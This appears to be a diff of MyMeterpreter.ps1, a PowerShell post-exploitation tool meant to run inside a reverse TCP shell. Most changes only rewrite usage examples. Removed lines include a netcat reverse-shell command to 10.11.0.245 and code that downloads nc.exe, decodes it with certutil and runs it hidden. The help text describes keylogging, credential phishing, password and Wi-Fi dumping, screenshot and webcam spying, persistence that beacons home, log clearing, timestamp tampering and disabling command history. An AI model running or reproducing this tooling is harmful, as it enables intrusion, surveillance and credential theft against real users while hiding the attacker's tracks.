@@ -19,19 +19,19 @@
    Persiste Agents on StartUp using 'beacon home' from 'xx' to 'xx' seconds technic, Etc ..
 
 .NOTES
-   Most of the CmdLines used in this CmdLet can be found in this Venom v1.0.17.7 wiki page: 
-   https://github.com/r00t-3xp10it/venom/wiki/CmdLine-&-Scripts-for-reverse-TCP-shell-addicts
+   powershell -File MyMeterpreter.ps1 syntax its required to get outputs back in our reverse
+   tcp shell connection, or else MyMeterpreter auxiliary will not display outputs on rev shell.
 
 .EXAMPLE
    PS C:\> Get-Help .\MyMeterpreter.ps1 -full
    Access This CmdLet Comment_Based_Help
 
 .EXAMPLE
-   PS C:\> .\MyMeterpreter.ps1 -Help parameters
+   PS C:\> powershell -File MyMeterpreter.ps1 -Help parameters
    List all CmdLet parameters available
 
 .EXAMPLE
-   PS C:\> .\MyMeterpreter.ps1 -Help [ Parameter Name ]
+   PS C:\> powershell -File MyMeterpreter.ps1 -Help [ Parameter Name ]
    Detailed information about Selected Parameter
 
 .INPUTS
@@ -61,12 +61,13 @@
     https://github.com/r00t-3xp10it/venom/tree/master/aux/MyMeterpreter.ps1
     https://github.com/r00t-3xp10it/venom/tree/master/aux/Start-WebServer.ps1
     https://github.com/r00t-3xp10it/venom/blob/master/bin/meterpeter/mimiRatz/CredsPhish.ps1
+    https://github.com/r00t-3xp10it/venom/wiki/CmdLine-&-Scripts-for-reverse-TCP-shell-addicts
 #>
 
 ## TODO:
 # fazer o download deste script para %tmp% usando o dropper
 # Assim o utilizador so tem the chamar este script na rev tcp shell
-# Shell Options: Get-Help .\MyMeterpreter.ps1 -full
+# Shell Options: Get-Help powershell -File MyMeterpreter.ps1 -full
 
 
 ## Non-Positional cmdlet named parameters
@@ -110,9 +111,9 @@
    [int]$Interval='10',
    [int]$SPort='8080',
    [int]$NewEst='10',
+   [int]$TimeOut='5',
    [int]$Timmer='10',
    [int]$Volume='88',
-   [int]$TimeOut='5',
    [int]$Delay='1',
    [int]$Rate='1'
 )
@@ -132,7 +133,7 @@ $Banner = @"
 |  \/  |\ \/ /|  \/  || ===||_   _|| ===|| () )| ()_)| () )| ===||_   _|| ===|| () )
 |_|\/|_| |__| |_|\/|_||____|  |_|  |____||_|\_\|_|   |_|\_\|____|  |_|  |____||_|\_\    
               Author: r00t-3xp10it - SSAredTeam @2021 - Version: $CmdletVersion
-                   CmdLet Help: .\MyMeterpreter.ps1 -Help Parameters
+              Help: powershell -File MyMeterpreter.ps1 -Help Parameters
 
       
 "@;
@@ -140,43 +141,25 @@ Clear-Host
 Write-Host "$Banner" -ForegroundColor Blue
 ## Disable Powershell Command Logging for current session.
 Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
-$HiddePublicIPaddr = $False ## manual => enable|disable Public-IP displays
-
-
-<# TODO:
-
-   ## Search for creds on registry
-   HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon DefaultPassword
-    
-   ## FTP
-   (echo open 10.11.0.245&echo anonymous&echo whatever&echo binary&echo get nc.exe&echo bye) > ftp.txt & ftp -s:ftp.txt & nc.exe 10.11.0.245 443 -e cmd
-
-   ## Certuil decode routine
-   If((Test-Path -Path "$env:TEMP\nc.exe.txt") -ne $true -and (Test-Path -Path "$env:TEMP\nc.exe") -ne $true){
-      Start-BitsTransfer -Source 'https://raw.githubusercontent.com/securethelogs/Powershell/master/Tools/nc.exe'-Destination $env:TEMP\nc.exe.txt
-      certutil -decode $env:TEMP\nc.exe.txt $env:TEMP\nc.exe
-
-      $downnet = Test-Path -Path $env:TEMP\nc.exe -ErrorAction SilentlyContinue
-      If($downnet -eq $true){
-         Start-Process powershell -WindowStyle Hidden -ArgumentList "-nop $env:TEMP\nc.exe $atk $port -e cmd.exe"
-      }
-   }
-
-#>
+$HiddePublicIPaddr = $False ## Manual => enable|disable Public-IP displays
+## Helper - User Input Bad Syntax
+If($Help -Match '^[-]'){## fix bad syntax
+   $Help = $Help -replace '^[-]',''
+}
 
 
 If($Help -ieq "Parameters"){
 
    <#
    .SYNOPSIS
-      Helper - List CmdLet Parameters Available
-      
+      Helper - List ALL CmdLet Parameters Available
+
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -Help Parameters
+      PS C:\> powershell -File MyMeterpreter.ps1 -Help Parameters
    #>
 
-Write-Host "  Syntax : .\MyMeterpreter.ps1 [ -Parameter ] [ Argument ]"
-Write-Host "  Example: .\MyMeterpreter.ps1 -SysInfo Verbose -Screenshot 2 -Delay 5 "
+Write-Host "  Syntax : powershell -File MyMeterpreter.ps1 [ -Parameter ] [ Argument ]"
+Write-Host "  Example: powershell -File MyMeterpreter.ps1 -SysInfo Verbose -Screenshot 2"
 Write-Host "`n  P4rameters        @rguments            Descripti0n" -ForegroundColor Green
 Write-Host "  ---------------   ------------         ---------------------------------------"
 $ListParameters = @"
@@ -202,12 +185,14 @@ $ListParameters = @"
   -Persiste         `$Env:TMP\script.ps1  Persiste script.ps1 on every startup {BeaconHome}
   -CleanTracks      Clear|Paranoid       Clean disk artifacts left behind {clean system tracks}
   -FileMace         `$Env:TMP\test.txt    Change File Mace {CreationTime,LastAccessTime,LastWriteTime}
-  -MsgBox           "Hello World."       Spawns "Hello World." msgBox on local host {ComObject} 
+  -MsgBox           "Hello World."       Spawns "Hello World." msgBox on local host {wscriptComObject} 
   -SpeakPrank       "Hello World."       Make remote host speak user input sentence {prank}
 
 "@;
-Write-Host "$ListParameters"
-Write-Host "  Help: .\MyMeterpreter.ps1 -Help [ Parameter Name ]                    " -ForeGroundColor black -BackGroundColor White
+echo $ListParameters > $Env:TMP\mytable.mt
+Get-Content -Path "$Env:TMP\mytable.mt"
+Remove-Item -Path "$Env:TMP\mytable.mt" -Force
+Write-Host "  Help: powershell -File MyMeterpreter.ps1 -Help [ Parameter Name ]     " -ForeGroundColor black -BackGroundColor White
 Write-Host ""
 }
 
@@ -218,10 +203,10 @@ If($GetDnsCache -ieq "Enum" -or $GetDnsCache -ieq "Clear"){
       Helper - Enumerate remote host DNS cache entrys
       
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -GetDnsCache Enum
+      PS C:\> powershell -File MyMeterpreter.ps1 -GetDnsCache Enum
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -GetDnsCache Clear
+      PS C:\> powershell -File MyMeterpreter.ps1 -GetDnsCache Clear
       Clear Dns Cache entrys {delete entrys}
 
    .OUTPUTS
@@ -262,11 +247,11 @@ If($SysInfo -ieq "Enum" -or $SysInfo -ieq "Verbose"){
       UACsettings, WorkingDirectoryDACL, BehaviorMonitorEnabled, Etc..
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -SysInfo Enum
-      Remote Host Fast Enumeration Module
+      PS C:\> powershell -File MyMeterpreter.ps1 -SysInfo Enum
+      Remote Host Quick Enumeration Module
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -SysInfo Verbose
+      PS C:\> powershell -File MyMeterpreter.ps1 -SysInfo Verbose
       Remote Host Detailed Enumeration Module
    #>
 
@@ -285,9 +270,9 @@ If($SysInfo -ieq "Enum" -or $SysInfo -ieq "Verbose"){
 
    ## Get default webbrowser
    $DefaultBrowser = (Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\Shell\Associations\UrlAssociations\https\UserChoice' -ErrorAction SilentlyContinue).ProgId
-   If($DefaultBrowser){
+   If($DefaultBrowser){## Parsing registry data
       $Parse_Browser_Data = $DefaultBrowser.split("-")[0] -replace 'URL','' -replace 'HTML','' -replace '.HTTPS',''
-   }Else{
+   }Else{## default webbrowser reg key not found
       $Parse_Browser_Data = "Not Found"
    }
 
@@ -323,17 +308,15 @@ If($SysInfo -ieq "Enum" -or $SysInfo -ieq "Verbose"){
    Get-PsDrive -PsProvider filesystem|Select-Object Name,Root,CurrentLocation,Used,Free|Format-Table -AutoSize
 
    ## Get User Accounts
-   # Write-Host "User accounts for \\$Env:COMPUTERNAME"
-   # Write-Host "-----------------------------------------------------------------"
    Get-LocalUser|Select-Object Name,Enabled,PasswordRequired,UserMayChangePassword -EA SilentlyContinue|Format-Table
 
-   ## Detailed Enumeration function
-   If($SysInfo -ieq "Verbose"){
+
+   If($SysInfo -ieq "Verbose"){## Detailed Enumeration function
 
       $Constrained = $ExecutionContext.SessionState.LanguageMode
       If($Constrained -ieq "ConstrainedLanguage"){
         $ConState = "Enabled"
-      }Else{
+      }Else{## disabled
         $ConState = "Disabled"
       }
 
@@ -367,7 +350,7 @@ If($SysInfo -ieq "Enum" -or $SysInfo -ieq "Verbose"){
       $ConsentPromptBehaviorAdmin = (Get-Itemproperty -path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\policies\system').ConsentPromptBehaviorAdmin
       $ConsentPromptBehaviorUser = (Get-Itemproperty -path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\policies\system').ConsentPromptBehaviorUser
 
-      ## Parse UAC Reg Data
+      ## Parsing UAC Registry Data
       If($ConsentPromptBehaviorAdmin -ieq "5" -and $ConsentPromptBehaviorUser -ieq "3"){
         $UacSettings = "Notify Me" ## Defaul value
       }ElseIf($ConsentPromptBehaviorAdmin -ieq "0" -and $ConsentPromptBehaviorUser -ieq "0"){
@@ -386,7 +369,7 @@ If($SysInfo -ieq "Enum" -or $SysInfo -ieq "Verbose"){
          $UacStatus = "`$null"
       }
 
-      ## Get Credentials from Guard Status
+      ## Get Credentials from Credential Guard
       If($OsVersion.Major -ge 10){## Not Supported on Windows >= 10
          $RegPath = "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\LSA"
          $Result = Get-ItemProperty -Path "Registry::$($RegPath)" -EA SilentlyContinue -ErrorVariable GetItemPropertyError
@@ -486,14 +469,12 @@ If($SysInfo -ieq "Enum" -or $SysInfo -ieq "Verbose"){
          $GETMRUList -replace '\\1','' -replace 'REG_SZ','' -replace 'HKEY_CURRENT_USER\\software\\microsoft\\windows\\currentversion\\explorer\\runmru',''|? {$_.trim() -ne ""}
       }
 
-
       ## TobeContinued ..
    }
    Write-Host "";Start-Sleep -Seconds 1
 }
 
 If($MsgBox -ne "false"){
-If($TimeOut -lt 5 -or $TimeOut -gt 120){$TimeOut = "5"}
 
    <#
    .SYNOPSIS
@@ -502,6 +483,7 @@ If($TimeOut -lt 5 -or $TimeOut -gt 120){$TimeOut = "5"}
    .NOTES
       Required Dependencies: Wscript ComObject {native}
       Remark: Double Quotes are Mandatory in -MsgBox value
+      Remark: -TimeOut 0 parameter maintains msgbox open.
 
       MsgBox Button Types
       -------------------
@@ -513,15 +495,20 @@ If($TimeOut -lt 5 -or $TimeOut -gt 120){$TimeOut = "5"}
       5 - Show Retry and Cancel buttons. 
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -MsgBox "Hello World."
+      PS C:\> powershell -File MyMeterpreter.ps1 -MsgBox "Hello World."
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -MsgBox "Hello World." -ButtonType 4
-      Spawns message box with Yes and No buttons
+      PS C:\> powershell -File MyMeterpreter.ps1 -MsgBox "Hello World." -TimeOut 4
+      Spawn message box and close msgbox after 4 seconds time {-TimeOut 4}
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -MsgBox "Hello World." -TimeOut 5
-      When the Timeout is reached (seconds) the MessageBox closes.
+      PS C:\> powershell -File MyMeterpreter.ps1 -MsgBox "Hello World." -ButtonType 4
+      Spawns message box with Yes and No buttons {-ButtonType 4}
+
+   .OUTPUTS
+      TimeOut  ButtonType           Message
+      -------  ----------           -------
+      5 (sec)  'Yes and No buttons' 'Hello World.'
    #>
 
    ## Set Button Type local var
@@ -544,15 +531,14 @@ If($TimeOut -lt 5 -or $TimeOut -gt 120){$TimeOut = "5"}
    $mytable.Columns.Add("TimeOut")|Out-Null
    $mytable.Columns.Add("ButtonType")|Out-Null
    $mytable.Columns.Add("Message")|Out-Null
-   $mytable.Rows.Add("$TimeOut",
+   $mytable.Rows.Add("$TimeOut (sec)",
                      "$Buttonflag",
                      "'$MsgBox'")|Out-Null
 
    ## Display Data Table
    $mytable|Format-Table -AutoSize
-
    ## Execute personalized MessageBox
-   (New-Object -ComObject Wscript.Shell).Popup("""$MsgBox""",$TimeOut,"""@MyMeterpreter - v1.0.5-dev""",$ButtonType+64)|Out-Null
+   (New-Object -ComObject Wscript.Shell).Popup("""$MsgBox""",$TimeOut,"""®MyMeterpreter - ${CmdletVersion}-dev""",$ButtonType+64)|Out-Null
 }
 
 If($SpeakPrank -ne "False"){
@@ -573,16 +559,16 @@ If($Volume -gt '100'){$Volume = "100"} ## Speach Volume max\min value accepted
       Remark: -Rate Parameter configs the SpeechSynthesizer speed
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -SpeakPrank "Hello World"
+      PS C:\> powershell -File MyMeterpreter.ps1 -SpeakPrank "Hello World"
       Make remote host speak "Hello World" {-Rate 1 -Volume 88}
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -SpeakPrank "Hello World" -Rate 5 -Volume 100
+      PS C:\> powershell -File MyMeterpreter.ps1 -SpeakPrank "Hello World" -Rate 5 -Volume 100
 
    .OUTPUTS
       RemoteHost SpeachSpeed Volume Speak        
       ---------- ----------- ------ -----        
-      SKYNET     1           88     'hello world'
+      SKYNET     5           100    'hello world'
    #>
 
    ## Local Function Variable declarations
@@ -625,11 +611,11 @@ If($GetConnections -ieq "Enum" -or $GetConnections -ieq "Verbose"){
       ProcessName associated from the connection PID identifier
     
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -GetConnections Enum
+      PS C:\> powershell -File MyMeterpreter.ps1 -GetConnections Enum
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -GetConnections Verbose
-      Retrieves process info from the connection PID identifier
+      PS C:\> powershell -File MyMeterpreter.ps1 -GetConnections Verbose
+      Retrieves process info from the connection PID (Id) identifier
 
    .OUTPUTS
       Proto  Local Address          Foreign Address        State           Id
@@ -648,7 +634,7 @@ If($GetConnections -ieq "Enum" -or $GetConnections -ieq "Verbose"){
    Write-Host "`nProto  Local Address          Foreign Address        State           Id"
    Write-Host "-----  -------------          ---------------        -----           --"
    $TcpList = netstat -ano|findstr "ESTABLISHED LISTENING"|findstr /V "[ UDP 0.0.0.0:0"
-   If($? -ieq $False){
+   If($? -ieq $False){## fail to retrieve List of ESTABLISHED TCP connections!
       Write-Host "  [error] fail to retrieve List of ESTABLISHED TCP connections!" -ForegroundColor Red -BackgroundColor Black
       Write-Host "";Start-Sleep -Seconds 1;exit ## Exit @MyMeterpreter
    }
@@ -658,16 +644,16 @@ If($GetConnections -ieq "Enum" -or $GetConnections -ieq "Verbose"){
    $parsedata = $TcpList -replace '^(\s+)',''
    echo $parsedata
    
-
    If($GetConnections -ieq "Verbose"){## Verbose module
       Write-Host "" ## List of ProcessName + PID associated to $Tcplist
       $PidList = netstat -ano|findstr "ESTABLISHED LISTENING"|findstr /V "[ UDP 0.0.0.0:0"
-      ForEach($Item in $PidList){
+      ForEach($Item in $PidList){## Loop truth ESTABLISHED connections
          echo $Item.split()[-1] >> test.log
       }
       $PPid = Get-Content -Path "test.log"
       Remove-Item -Path "test.log" -Force
 
+      ## ESTABLISHED Connections PID (Id) Loop
       ForEach($Token in $PPid){
          Get-Process -PID $Token
       }
@@ -685,7 +671,7 @@ If($GetInstalled -ieq "Enum"){
       Enumerates appl installed and respective versions
 
    .EXAMPLE
-      PC C:\> .\MyMeterpreter.ps1 -GetInstalled Enum
+      PC C:\> powershell -File MyMeterpreter.ps1 -GetInstalled Enum
 
    .OUTPUTS
       DisplayName                   DisplayVersion     
@@ -712,15 +698,15 @@ If($GetProcess -ieq "Enum" -or $GetProcess -ieq "Kill"){
       then cmdlet 'kill' or 'enum' the sellected processName.
 
    .EXAMPLE
-      PC C:\> .\MyMeterpreter.ps1 -GetProcess Enum
+      PC C:\> powershell -File MyMeterpreter.ps1 -GetProcess Enum
       Enumerate ALL Remote Host Running Process(s)
 
    .EXAMPLE
-      PC C:\> .\MyMeterpreter.ps1 -GetProcess Enum -ProcessName firefox.exe
+      PC C:\> powershell -File MyMeterpreter.ps1 -GetProcess Enum -ProcessName firefox.exe
       Enumerate firefox.exe Process {Id,Name,Path,Company,StartTime,Responding}
 
    .EXAMPLE
-      PC C:\> .\MyMeterpreter.ps1 -GetProcess Kill -ProcessName firefox.exe
+      PC C:\> powershell -File MyMeterpreter.ps1 -GetProcess Kill -ProcessName firefox.exe
       Kill Remote Host firefox.exe Running Process
 
    .OUTPUTS
@@ -799,18 +785,18 @@ If($GetTasks -ieq "Enum" -or $GetTasks -ieq "Create" -or $GetTasks -ieq "Delete"
       Remark: Tasks have the default duration of 9 hours.
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -GetTasks Enum
+      PS C:\> powershell -File MyMeterpreter.ps1 -GetTasks Enum
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -GetTasks Create
+      PS C:\> powershell -File MyMeterpreter.ps1 -GetTasks Create
       Use module default settings to create the demo task
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -GetTasks Delete -TaskName mytask
+      PS C:\> powershell -File MyMeterpreter.ps1 -GetTasks Delete -TaskName mytask
       Deletes mytask taskname
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -GetTasks Create -TaskName mytask -Interval 10 -Exec "cmd /c start calc.exe"
+      PS C:\> powershell -File MyMeterpreter.ps1 -GetTasks Create -TaskName mytask -Interval 10 -Exec "cmd /c start calc.exe"
 
    .OUTPUTS
       TaskName                                 Next Run Time          Status
@@ -863,19 +849,19 @@ If($NewEst -lt "5" -or $NewEst -gt "80"){$NewEst = "10"} ## Set the max\min logs
       on shell to be abble to 'Clear' Eventvwr entrys.
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -GetLogs Enum
+      PS C:\> powershell -File MyMeterpreter.ps1 -GetLogs Enum
       Lists ALL eventvwr categorie entrys
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -GetLogs Verbose
+      PS C:\> powershell -File MyMeterpreter.ps1 -GetLogs Verbose
       List the newest 10(default) Powershell\Application\System entrys
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -GetLogs Verbose -NewEst 28
+      PS C:\> powershell -File MyMeterpreter.ps1 -GetLogs Verbose -NewEst 28
       List the newest 28 Eventvwr Powershell\Application\System entrys
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -GetLogs Clear
+      PS C:\> powershell -File MyMeterpreter.ps1 -GetLogs Clear
       Remark: Clear @arg requires Administrator privs on shell
 
    .OUTPUTS
@@ -985,11 +971,11 @@ If($GetBrowsers -ieq "Enum" -or $GetBrowsers -ieq "Verbose"){
       And identify install browsers and run enum modules.
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -GetBrowsers Enum
+      PS C:\> powershell -File MyMeterpreter.ps1 -GetBrowsers Enum
       Identify installed browsers and versions
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -GetBrowsers Verbose
+      PS C:\> powershell -File MyMeterpreter.ps1 -GetBrowsers Verbose
       Run enumeration modules againts ALL installed browsers
 
    .OUTPUTS
@@ -1066,11 +1052,11 @@ If($Delay -lt '1' -or $Delay -gt '180'){$Delay = '1'} ## Screenshots delay time 
       or to spy target user activity using -Delay parameter.
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -Screenshot 1
+      PS C:\> powershell -File MyMeterpreter.ps1 -Screenshot 1
       Capture 1 desktop screenshot and store it on %TMP%.
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -Screenshot 5 -Delay 8
+      PS C:\> powershell -File MyMeterpreter.ps1 -Screenshot 5 -Delay 8
       Capture 5 desktop screenshots with 8 secs delay between captures.
 
    .OUTPUTS
@@ -1137,11 +1123,11 @@ If($Camera -ieq "Enum" -or $Camera -ieq "Snap"){
       our binary file and bypass AV amsi detection.
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -Camera Enum
+      PS C:\> powershell -File MyMeterpreter.ps1 -Camera Enum
       List ALL WebCams Device Names available
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -Camera Snap
+      PS C:\> powershell -File MyMeterpreter.ps1 -Camera Snap
       Take one screenshot using default camera
 
    .OUTPUTS
@@ -1265,22 +1251,22 @@ If($StartWebServer -ieq "Python" -or $StartWebServer -ieq "Powershell"){
       to allow users to silent browse/read/download files from remote host.
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -StartWebServer Python
+      PS C:\> powershell -File MyMeterpreter.ps1 -StartWebServer Python
       Downloads webserver.ps1 to %TMP% and executes the webserver.
       Remark: This Module uses Social Enginnering to trick remote host into
       installing python (python http.server) if remote host does not have it.
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -StartWebServer Python -SPort 8087
+      PS C:\> powershell -File MyMeterpreter.ps1 -StartWebServer Python -SPort 8087
       Downloads webserver.ps1 and executes the webserver on port 8087
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -StartWebServer Powershell
+      PS C:\> powershell -File MyMeterpreter.ps1 -StartWebServer Powershell
       Downloads Start-WebServer.ps1 and executes the webserver.
       Remark: Admin privileges are requiered in shell to run the WebServer
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -StartWebServer Powershell -SPort 8087
+      PS C:\> powershell -File MyMeterpreter.ps1 -StartWebServer Powershell -SPort 8087
       Downloads Start-WebServer.ps1 and executes the webserver on port 8087
       Remark: Admin privileges are requiered in shell to run the WebServer
    #>
@@ -1348,7 +1334,7 @@ If($Upload -ne "false"){
       -Destination parameter its auto set to $Env:TMP by default.
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -Upload FileName.ps1 -ApacheAddr 192.168.1.73 -Destination $Env:TMP\FileName.ps1
+      PS C:\> powershell -File MyMeterpreter.ps1 -Upload FileName.ps1 -ApacheAddr 192.168.1.73 -Destination $Env:TMP\FileName.ps1
       Downloads FileName.ps1 script from attacker apache2 (192.168.1.73) into $Env:TMP\FileName.ps1 Local directory
    #>
 
@@ -1442,12 +1428,12 @@ $Timer = Get-Date -Format 'HH:mm:ss'
       its deleted or is process {void.exe} its stoped.
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -Keylogger Start
+      PS C:\> powershell -File MyMeterpreter.ps1 -Keylogger Start
       Download/Execute void.exe in child process
       to be abble to capture system keystrokes
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -Keylogger Stop
+      PS C:\> powershell -File MyMeterpreter.ps1 -Keylogger Stop
       Stop keylogger by is process FileName identifier
       and delete keylogger and all respective files/logs
 
@@ -1549,11 +1535,11 @@ If($Timmer -lt '10' -or $Timmer -gt '300'){$Timmer = '10'}
       Required Dependencies: psr.exe {native}
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -Mouselogger Start
+      PS C:\> powershell -File MyMeterpreter.ps1 -Mouselogger Start
       Capture Screenshots of Mouse Clicks for 10 secs {default}
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -Mouselogger Start -Timmer 28
+      PS C:\> powershell -File MyMeterpreter.ps1 -Mouselogger Start -Timmer 28
       Capture Screenshots of remote Mouse Clicks for 28 seconds
 
    .OUTPUTS
@@ -1614,7 +1600,7 @@ If($PhishCreds -ieq "Start"){
       Remark: On Windows <= 10 lmhosts and lanmanserver are running by default.
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -PhishCreds Start
+      PS C:\> powershell -File MyMeterpreter.ps1 -PhishCreds Start
       Prompt the current user for a valid credential.
 
    .OUTPUTS
@@ -1668,15 +1654,15 @@ If($GetPasswords -ieq "Enum" -or $GetPasswords -ieq "Dump"){## <-- TODO: finish 
       REG ADD "HKLM\System\CurrentControlSet\Control\lsa" /v "notification packages" /t REG_MULTI_SZ /d scecli /f
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -GetPasswords Enum
+      PS C:\> powershell -File MyMeterpreter.ps1 -GetPasswords Enum
       Dumps passwords from disk\regedit diferent locations
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -GetPasswords Enum -StartDir $Env:USERPROFILE
+      PS C:\> powershell -File MyMeterpreter.ps1 -GetPasswords Enum -StartDir $Env:USERPROFILE
       Searches for credentials recursive in text files starting in -StartDir
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -GetPasswords Dump
+      PS C:\> powershell -File MyMeterpreter.ps1 -GetPasswords Dump
       Intercepts user changed passwords {logon}
 
    .OUTPUTS
@@ -1802,12 +1788,12 @@ If($EOP -ieq "Verbose" -or $EOP -ieq "Enum"){
       Sherlock.ps1 GitHub WIKI page: https://tinyurl.com/y4mxe29h
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -EOP Enum
+      PS C:\> powershell -File MyMeterpreter.ps1 -EOP Enum
       Scans GroupName Everyone and permissions (F)
       Unquoted Service vuln Paths, Dll-Hijack, etc.
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -EOP Verbose
+      PS C:\> powershell -File MyMeterpreter.ps1 -EOP Verbose
       Scans the Three Group Names and Permissions (F)(W)(M)
       And presents a more elaborate report with extra tests.
 
@@ -1871,17 +1857,17 @@ $PerState = $False ## Persistence active yes|no query!
       to manual check the status of wscript process (BeaconHome function)
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -Persiste Stop
+      PS C:\> powershell -File MyMeterpreter.ps1 -Persiste Stop
       Stops wscript process (vbs) and delete persistence.vbs script
       Remark: This function stops the persiste.vbs from beacon home
       and deletes persiste.vbs Leaving our reverse tcp shell intact.
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -Persiste `$Env:TMP\Payload.ps1
+      PS C:\> powershell -File MyMeterpreter.ps1 -Persiste `$Env:TMP\Payload.ps1
       Execute Payload.ps1 at every StartUp with 10 sec of interval between each execution
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -Persiste `$Env:TMP\Payload.ps1 -BeaconTime 28
+      PS C:\> powershell -File MyMeterpreter.ps1 -Persiste `$Env:TMP\Payload.ps1 -BeaconTime 28
       Execute Payload.ps1 at every StartUp with 28 sec of interval between each execution
 
    .OUTPUTS
@@ -2004,15 +1990,15 @@ $FileName = "SSIDump.zip" ## Default Zip Archive Name
       Required Dependencies: netsh {native}
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -WifiPasswords Dump
+      PS C:\> powershell -File MyMeterpreter.ps1 -WifiPasswords Dump
       Dump ALL Wifi Passwords on this terminal prompt
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -WifiPasswords ZipDump
+      PS C:\> powershell -File MyMeterpreter.ps1 -WifiPasswords ZipDump
       Dump Wifi Paswords into a Zip archive on %TMP% {default}
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -WifiPasswords ZipDump -Storage `$Env:APPDATA
+      PS C:\> powershell -File MyMeterpreter.ps1 -WifiPasswords ZipDump -Storage `$Env:APPDATA
       Dump Wifi Paswords into a Zip archive on %APPDATA% remote directory
 
    .OUTPUTS
@@ -2080,7 +2066,7 @@ If($BruteZip -ne "false"){
       Remark: Use double quotes if path contains any empty spaces.
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -BruteZip `$Env:USERPROFILE\Desktop\Archive.zip
+      PS C:\> powershell -File MyMeterpreter.ps1 -BruteZip `$Env:USERPROFILE\Desktop\Archive.zip
       Brute forces the zip archive defined by -BruteZip parameter with 7z.exe bin.
 
    .LINK
@@ -2178,11 +2164,11 @@ If($FileMace -ne "false"){
       Remark: Double quotes are mandatory in -Date parameter
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -FileMace $Env:TMP\test.txt
+      PS C:\> powershell -File MyMeterpreter.ps1 -FileMace $Env:TMP\test.txt
       Changes sellected file mace using MyMeterprter default -Date "date-format"
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -FileMace $Env:TMP\test.txt -Date "08 March 1999 19:19:19"
+      PS C:\> powershell -File MyMeterpreter.ps1 -FileMace $Env:TMP\test.txt -Date "08 March 1999 19:19:19"
       Changes sellected file mace using user inputed -Date "date-format"
 
    .OUTPUTS
@@ -2232,10 +2218,10 @@ $MyArtifacts = 0 ## MyMeterpreter aux scripts
       Required Dependencies: cmd|regedit {native}
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -CleanTracks Clear
+      PS C:\> powershell -File MyMeterpreter.ps1 -CleanTracks Clear
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -CleanTracks Paranoid
+      PS C:\> powershell -File MyMeterpreter.ps1 -CleanTracks Paranoid
       Remark: Paranoid @arg deletes @MyMeterpreter aux scripts
 
    .OUTPUTS
@@ -2382,6 +2368,10 @@ Write-Host "";Start-Sleep -Seconds 1
 ## --------------------------------------------------------------
 
 
+If($Help -Match '^[-]'){## User Input bad syntax
+   $Help = $Help -replace '^[-]','' ## fix bad syntax
+}
+
 If($Help -ieq "sysinfo"){
 $HelpParameters = @"
 
@@ -2398,11 +2388,11 @@ $HelpParameters = @"
       CmdLet and change '`$HiddePublicIPaddr = `$False' to `$True ..
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -SysInfo Enum
+      PS C:\> powershell -File MyMeterpreter.ps1 -SysInfo Enum
       Remote Host Quick Enumeration Module
 
    .EXAMPLE
